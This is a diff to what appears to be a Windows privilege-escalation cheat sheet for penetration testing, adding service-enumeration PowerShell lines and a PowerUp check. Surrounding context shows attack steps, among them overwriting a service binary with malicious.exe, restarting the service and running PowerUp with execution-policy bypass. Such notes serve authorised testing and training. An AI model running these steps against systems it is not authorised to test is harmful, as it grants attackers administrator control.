@@ -348,7 +348,6 @@ sc start AppReadiness
 # Step 5: Verify admin membership
 net localgroup Administrators
 ```
-
 ---
 
 ## 4. Attacking the OS
@@ -399,7 +398,13 @@ cmd /c copy /Y malicious.exe "C:\Program Files (x86)\PCProtect\SecurityService.e
 # Step 4: Start service
 sc start SecurityService
 ```
+````
+# List the services running
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
 
+# List the StartMode
+Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
+````
 ````cmd
 # List all services and users
 Get-WmiObject Win32_Service | Select-Object Name, StartName, State | Format-Table -AutoSize
@@ -940,6 +945,7 @@ Import-Module .\EnumPrivEsc.ps1; Start-PrivEscEnum
 powershell -ep bypass
 Import-Module .\PowerUp.ps1
 Invoke-AllChecks
+Get-ModifiableServiceFile
 
 # SharpUp
 .\SharpUp.exe audit
